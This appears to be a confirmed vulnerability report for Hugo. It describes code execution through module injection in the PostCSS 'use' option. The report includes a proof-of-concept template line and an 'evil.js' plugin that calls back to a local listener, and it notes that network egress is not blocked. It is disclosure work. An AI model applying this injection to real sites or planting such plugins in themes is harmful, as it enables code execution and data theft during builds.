# VULN-002 — Node code exec via resources/css.PostCSS `--use` module injection

**Software**: Hugo
**Repository**: https://github.com/gohugoio/hugo
**Affected version**: 0.167.0-DEV (common/hugo/version_current.go:19-24) — commit-pinned: no tagged release
**Status**: CONFIRMED
**Severity (static)**: Medium
**Target commit**: c7f9999309a2e7a12d24c03fe639008ddc4565f8
**Validated at**: 2026-09-30

## Preconditions
- `postcss` + `postcss-cli` installed in the project (`npm install`), and a theme/template
  that calls `css.PostCSS`. DEFAULT security config (postcss/node are already default-allowed).
- Validated on `cvehunterlab_hugo_st10node:latest` (target hugo binary + **Node 24**). The
  base lab ships Node 18, which rejects the `--permission` flag Hugo applies by default, so
  PostCSS cannot run there at all; Node 24 lets this be validated under Hugo's DEFAULT Node
  hardening.

## Request / build input
- `evil.js` (a valid postcss8 plugin whose top-level code does `http.get('http://127.0.0.1:PORT/<marker>')`).
- `layouts/index.html`: `{{ $c := resources.Get "css/x.css" }}{{ $c | css.PostCSS (dict "use" "/site/evil.js") }}`.

## Response
See `response.txt`: build rc=0, and the OOB listener recorded **1** callout to
`/postcss-rce-<marker>` — the injected plugin executed.

## Observation
Predicted (postcss.go:112-131 forwards `--use` verbatim; postcss-cli require()s it;
securityConfig.go:181-190 vets only the binary name): confirmed. The `use` value named a
module that postcss-cli require()d and executed during the build. Crucially the callout
succeeded **under the default `node --permission`** — proving Node's permission model does
not restrict network egress, so an in-tree malicious plugin can still exfiltrate. (With
`security.node.permissions.disable=true` it becomes unrestricted RCE.)

## Side effects
- Wrote `node_modules/` into the throwaway site (postcss install). Isolated build dir.

## Research & references
- CWE-94 (code injection). Node Permission Model docs — restricts fs/child-process/worker/
  addons, **not** network — https://nodejs.org/api/permissions.html. Hugo Node-tool CVEs the
  class parallels: CVE-2026-44301 (permission added 0.161.0), CVE-2026-89259, CVE-2026-100690.
- postcss-cli `--use` loads the value as a Node module — https://github.com/postcss/postcss-cli.

## If FAILED
n/a — CONFIRMED. (Iterations: `resources.PostCSS`→`css.PostCSS`; Node 18→24 for `--permission`;
`./evil.js`→`/site/evil.js` because postcss-cli resolves `--use` relative to its own dir.)
